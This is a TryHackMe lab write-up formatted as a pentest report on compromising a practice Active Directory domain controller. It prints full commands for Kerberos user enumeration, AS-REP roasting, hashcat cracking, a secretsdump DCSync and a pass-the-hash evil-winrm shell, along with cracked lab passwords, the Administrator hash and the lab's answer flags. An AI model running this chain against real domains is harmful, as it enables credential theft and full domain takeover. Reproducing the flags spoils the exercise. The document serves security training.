# TryHackMe — Attacktive Directory: Penetration Test Report

**Target:** `10.48.160.211` (ATTACKTIVEDIRECTORY, domain `spookysec.local`)        
**Attacker host:** THM AttackBox (`10.48.86.152`)        
**Date:** 23 November 2026        
**Objective:** Enumerate and compromise a Windows Active Directory Domain Controller, escalating from anonymous network access to Domain Administrator.        

---

## 1. Executive Summary

This engagement targeted a single Windows Server 2019 Domain Controller for the domain `spookysec.local`. Using only unauthenticated network access, it was possible to:

1. Enumerate valid AD usernames via Kerberos.
2. Identify an account vulnerable to **AS-REP Roasting** (no Kerberos pre-authentication required).
3. Crack that account's password offline with a wordlist.
4. Use the cracked credentials to read an SMB share containing a Base64-encoded password for a second, more privileged account.
5. Use that second account to dump the entire domain's password hashes (including the Administrator's) via a DCSync-style attack.
6. Log in directly as **Administrator** using the hash alone (pass-the-hash), with no need to crack it.
7. Retrieve flags from the Administrator, `svc-admin`, and `backup` user desktops.

**Root cause:** Weak account hygiene (no pre-auth required on `svc-admin`, a weak password, and a plaintext/Base64 credential left on an SMB share) combined with excessive privileges on a secondary account, allowing a full domain compromise from an anonymous starting point.

---

## 2. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port/service discovery |
| `crackmapexec` / `netexec` | SMB enumeration, domain/OS fingerprinting, credential validation |
| `kerbrute` | Kerberos-based username enumeration |
| Impacket `GetNPUsers.py` | AS-REP Roasting (request hashes for accounts with no pre-auth) |
| `hashcat` | Offline password cracking |
| `smbclient` | SMB share browsing/file download |
| base64decode.org | Decoding a Base64 credential string |
| Impacket `secretsdump.py` | Dumping domain password hashes (NTDS.DIT secrets) |
| `evil-winrm` | Remote PowerShell shell via WinRM, using pass-the-hash |

---

## 3. Step-by-Step Walkthrough

### Step 1 — Port Scanning

A full TCP port scan was run against the target:

```
nmap -p- -T4 -v 10.48.160.211
```

<img width="1499" height="812" alt="image" src="https://github.com/user-attachments/assets/d7bd9176-0eef-41b7-8d19-56aae2e7967a" />

The scan completed and revealed a classic Active Directory Domain Controller port footprint: DNS (53), Kerberos (88), RPC (135), SMB (139/445), LDAP (389/636/3268/3269), WinRM (5985/47001), and RDP (3389).

<img width="1498" height="812" alt="image" src="https://github.com/user-attachments/assets/5ca3d71e-2f2a-4119-a14c-612ad2abaeaa" />

**What this tells us:** This is a Domain Controller (LDAP + Kerberos + SMB together is the signature). This immediately points toward AD-specific attacks rather than generic web/service exploitation.

### Step 2 — Confirming the Domain Name

`crackmapexec`/`netexec` was used against SMB to fingerprint the host:

```
crackmapexec smb 10.48.160.211
```

<img width="1498" height="812" alt="image" src="https://github.com/user-attachments/assets/cf15e702-0041-473e-ade5-9457871857ff" />

This revealed the hostname `ATTACKTIVEDIRECTORY` and, critically, the domain name **`spookysec.local`** — needed for every subsequent Kerberos/LDAP command.

### Step 3 — Username Enumeration via Kerberos

A wordlist of candidate usernames (`userlist.txt`) was downloaded, then fed to `kerbrute`, which abuses the Kerberos pre-authentication process to test which usernames exist on the domain (Kerberos gives a different error for "user doesn't exist" vs. "user exists, wrong password"):

```
kerbrute userenum -d spookysec.local --dc 10.48.160.211 userlist.txt
```

<img width="1499" height="812" alt="image" src="https://github.com/user-attachments/assets/d1ee79b1-c5fe-4319-9e5d-e2f58b6fa1cc" />

This returned a list of **valid usernames** (e.g. `james`, `svc-admin`, `robin`, `darkstar`, `administrator`, `backup`, `paradox`, `ori`), without needing any credentials at all.

### Step 4 — AS-REP Roasting

The valid usernames were saved to `valid_users.txt` and tested with Impacket's `GetNPUsers.py`, which asks the KDC for a Kerberos ticket **without** supplying a password. If an account has the attribute `UF_DONT_REQUIRE_PREAUTH` set, the KDC will happily hand back an encrypted ticket (the "AS-REP") that can be cracked offline:

```
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.48.160.211 -usersfile valid_users.txt -request
```

<img width="1497" height="812" alt="image" src="https://github.com/user-attachments/assets/a34b7be0-caa9-44d5-a70a-053adec12a40" />

Only one account, **`svc-admin`**, had pre-authentication disabled, and its AS-REP hash (`$krb5asrep$23$svc-admin@...`) was captured for offline cracking.

**What this means:** Kerberos pre-authentication exists specifically to stop this kind of attack. An account with it disabled is handing an attacker a crackable password hash with zero authentication required.

### Step 5 — Cracking the AS-REP Hash

The captured hash was cracked offline with `hashcat`, mode `18200` (Kerberos 5, etype 23, AS-REP), against a password wordlist:

```
hashcat -m 18200 hash.txt passwordlist.txt
```

<img width="1498" height="812" alt="image" src="https://github.com/user-attachments/assets/e697e3d2-9cb7-463e-b1ae-d46ec908b4c0" />

Within seconds, the password was recovered:

<img width="1502" height="812" alt="image" src="https://github.com/user-attachments/assets/c04b789f-3ed6-4862-8e09-b830b2dabad1" />

**Credential obtained:** `svc-admin : management2005`

### Step 6 — Validating Credentials and Enumerating Shares

The cracked credentials were validated against SMB and used to list available shares:

```
netexec smb 10.48.160.211 -u 'svc-admin' -p 'management2005' --shares
```

(output visible at the top of the next two screenshots)

A non-default share called **`backup`** stood out, readable by this account. After a couple of failed attempts against the wrong IP, the share was accessed on the correct DC address:

```
smbclient //10.48.160.211/backup -U 'svc-admin'
```

<img width="1502" height="812" alt="image" src="https://github.com/user-attachments/assets/d49432f8-1cd8-4617-8491-40fdd1e8de69" />

Inside was a single file: `backup_credentials.txt`. It was downloaded:

<img width="1511" height="812" alt="image" src="https://github.com/user-attachments/assets/ebcdf62c-d85f-4314-ac54-93c578b631f6" />

### Step 7 — Decoding the Backup Credentials

The file's contents were printed and turned out to be a Base64 string:

<img width="1499" height="812" alt="image" src="https://github.com/user-attachments/assets/2398d7b5-f3ab-4533-8a32-91189f0e3366" />

That string was decoded using an online Base64 decoder:

<img width="1498" height="812" alt="image" src="https://github.com/user-attachments/assets/7be936a0-26dd-4bc9-849f-4c74aff9c6e1" />

**Credential obtained:** `backup@spookysec.local : backup2517860`

**What this means:** The `backup` account is, by AD design intent, a member of a privileged group used for system/domain backups — which typically carries **replication rights** over the domain, equivalent to Domain Admin capability for extracting secrets.

### Step 8 — Dumping All Domain Hashes (DCSync)

With the `backup` account's credentials, Impacket's `secretsdump.py` was run against the Domain Controller. Because the `backup` account has directory-replication permissions, this performs a **DCSync attack** — impersonating a Domain Controller to pull every account's password hash straight out of the NTDS database:

```
secretsdump.py spookysec.local/backup:backup2517860@10.48.160.211
```

<img width="1501" height="812" alt="image" src="https://github.com/user-attachments/assets/027a78d8-2ade-49c2-8495-25abafb6972d" />

This dumped NTLM hashes and Kerberos AES keys for **every account in the domain**, including:

- `Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::`
- `krbtgt`, `svc-admin`, `backup`, and all other domain users

<img width="1499" height="812" alt="image" src="https://github.com/user-attachments/assets/3f109b27-5f74-4696-8fcf-706df0a1e707" />

### Step 9 — Pass-the-Hash as Administrator

The Administrator's NTLM hash did not need to be cracked at all — NTLM hashes can be used directly for authentication ("pass-the-hash"). `evil-winrm` was used to open a PowerShell session over WinRM using the hash:

```
evil-winrm -i 10.48.160.211 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
```

This dropped into an interactive shell as `thm-ad\administrator`, confirmed with `whoami`, and the root flag was retrieved from the Administrator's desktop:

```
TryHackMe{4ctiveD1rectoryM4st3r}
```

<img width="1499" height="812" alt="image" src="https://github.com/user-attachments/assets/b785b180-f91c-4d7f-a57e-a406a8124d9b" />

### Step 10 — Collecting Remaining Flags

Still inside the Administrator WinRM session, the other users' desktops were checked. The `svc-admin` desktop contained a user flag:

```
TryHackMe{K3rb3r0s_Pr3_4uth}
```

<img width="1505" height="812" alt="image" src="https://github.com/user-attachments/assets/c75fbbba-15c4-4926-b0f5-b76b0d906e32" />

And the `backup` account's desktop contained a privilege-escalation flag:

```
TryHackMe{B4ckM3UpSc0tty!}
```

<img width="1497" height="812" alt="image" src="https://github.com/user-attachments/assets/c7c0d30e-16bc-4dfb-9a3c-fe16e5906c90" />

---

## 4. Attack Chain Summary

```
Anonymous network access
        │
        ▼
Port scan → identify Domain Controller (spookysec.local)
        │
        ▼
kerbrute → enumerate valid usernames (no auth needed)
        │
        ▼
GetNPUsers.py → AS-REP Roast svc-admin (no pre-auth required)
        │
        ▼
hashcat → crack svc-admin's password ("management2005")
        │
        ▼
SMB (as svc-admin) → read "backup" share → backup_credentials.txt
        │
        ▼
Base64 decode → backup account's plaintext password
        │
        ▼
secretsdump.py (DCSync as backup) → dump ALL domain hashes
        │
        ▼
evil-winrm pass-the-hash → Administrator shell → full domain compromise
```

## 5. Key Takeaways / Lessons Learned

- **Kerberos pre-authentication should never be disabled** on service accounts — it's a direct and trivially exploitable path to a crackable password hash (AS-REP Roasting).
- **Weak passwords undermine every other control.** `management2005` was cracked almost instantly with a basic wordlist.
- **Never store credentials in files on shares**, even "obfuscated" with Base64 — Base64 is encoding, not encryption, and is reversible in seconds.
- **The `backup` account is extremely dangerous if compromised.** Built-in backup operator privileges are functionally equivalent to Domain Admin because they allow replication/DCSync-style secret extraction.
- **NTLM hashes are as good as passwords.** Once an NTLM hash is obtained, no cracking is required — it can be used directly to authenticate (pass-the-hash), which is why hash dumps must be treated with the same sensitivity as plaintext credentials.

## 6. Flags Captured

| Flag | Value | Source |
|---|---|---|
| Root flag | `TryHackMe{4ctiveD1rectoryM4st3r}` | Administrator desktop |
| User flag | `TryHackMe{K3rb3r0s_Pr3_4uth}` | svc-admin desktop |
| PrivEsc flag | `TryHackMe{B4ckM3UpSc0tty!}` | backup desktop |
